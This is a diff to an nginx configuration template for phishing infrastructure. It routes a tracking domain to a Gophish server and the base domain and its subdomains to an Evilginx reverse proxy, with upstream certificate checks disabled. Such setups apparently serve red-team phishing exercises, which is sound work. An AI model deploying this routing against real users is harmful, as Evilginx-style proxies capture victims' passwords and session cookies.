@@ -2,50 +2,56 @@ events {
     worker_connections 1024;
 }
 
-stream {
-    map $ssl_preread_server_name $backend_name {
-        ${EVIL_DOMAIN} evilginx_backend;
-        ${TRACK_DOMAIN} gophish_backend;
-        ${BASE_DOMAIN} nginx_http_backend;
-        default gophish_backend;
-    }
-
-    upstream evilginx_backend {
-        server ${EVILGINX_BACKEND}:443;
-    }
-
-    upstream gophish_backend {
-        server ${GOPHISH_BACKEND}:443;
-    }
-
-    upstream nginx_http_backend {
-        server 127.0.0.1:8080;
-    }
-
-    server {
-        listen 443;
-        proxy_pass $backend_name;
-        ssl_preread on;
-    }
-}
-
 http {
     include /etc/nginx/mime.types;
     default_type application/octet-stream;
 
     server {
-        listen 8080 ssl;
-        server_name ${BASE_DOMAIN};
+        listen 80;
+        server_name ${BASE_DOMAIN} *.${BASE_DOMAIN};
+        return 301 https://$host$request_uri;
+    }
+
+	server {
+        listen 443 ssl;
+        server_name ${TRACK_DOMAIN};
+
+        ssl_certificate /etc/nginx/certs/fullchain.pem;
+        ssl_certificate_key /etc/nginx/certs/privkey.pem;
+
+        location / {
+            proxy_pass https://${GOPHISH_BACKEND}:443;
+            proxy_set_header Host $host;
+            proxy_set_header X-Real-IP $remote_addr;
+            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+            proxy_set_header X-Forwarded-Proto $scheme;
+            proxy_redirect off;
+        }
+    }
+
+    server {
+        listen 443 ssl;
+        server_name ${BASE_DOMAIN} *.${BASE_DOMAIN};
 
         ssl_certificate /etc/nginx/certs/fullchain.pem;
         ssl_certificate_key /etc/nginx/certs/privkey.pem;
 
         location ^~ /.well-known/mta-sts.txt {
             alias /var/www/html/mta-sts.txt;
+            default_type text/plain;
         }
 
         location / {
-            return 301 https://${TRACK_DOMAIN}$request_uri;
+            proxy_pass https://${EVILGINX_BACKEND}:443;
+
+            proxy_set_header Host $host;
+            proxy_set_header X-Real-IP $remote_addr;
+            proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+            proxy_set_header X-Forwarded-Proto $scheme;
+
+            proxy_ssl_server_name on;
+            proxy_ssl_name $host;
+            proxy_ssl_verify off;
         }
     }
 }
